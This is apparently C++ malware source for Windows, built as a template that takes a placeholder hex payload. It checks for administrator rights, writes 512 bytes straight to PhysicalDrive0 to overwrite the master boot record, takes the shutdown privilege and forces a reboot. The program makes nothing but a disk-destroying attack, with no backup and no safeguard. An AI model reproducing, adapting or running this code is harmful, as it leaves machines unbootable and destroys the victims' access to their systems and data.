#include <windows.h>
#include <string>
#include <vector>

const char MBR_HEX[] = "{MBR_DATA}";

std::vector<unsigned char> HexToBytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        unsigned char byte = (unsigned char)strtol(byteString.c_str(), NULL, 16);
        bytes.push_back(byte);
    }
    return bytes;
}

void WriteMBR() {
    std::string hex(MBR_HEX);
    std::vector<unsigned char> mbr = HexToBytes(hex);
    
    if (mbr.size() != 512) {
        MessageBoxA(NULL, "Invalid MBR size!", "Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    HANDLE hDisk = CreateFileA(
        "\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hDisk == INVALID_HANDLE_VALUE) {
        MessageBoxA(NULL, "Failed to open disk! Run as Administrator.", "Error", MB_OK | MB_ICONERROR);
        return;
    }
    
    DWORD bytesWritten;
    if (!WriteFile(hDisk, mbr.data(), 512, &bytesWritten, NULL)) {
        MessageBoxA(NULL, "Failed to write MBR!", "Error", MB_OK | MB_ICONERROR);
        CloseHandle(hDisk);
        return;
    }
    
    CloseHandle(hDisk);
    MessageBoxA(NULL, "MBR successfully overwritten!\nSystem will restart.", "Success", MB_OK | MB_ICONINFORMATION);
    
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
    ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_OTHER);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsUserAnAdmin()) {
        MessageBoxA(NULL, "Please run as Administrator!", "Error", MB_OK | MB_ICONERROR);
        return 1;
    }
    
    WriteMBR();
    return 0;
}
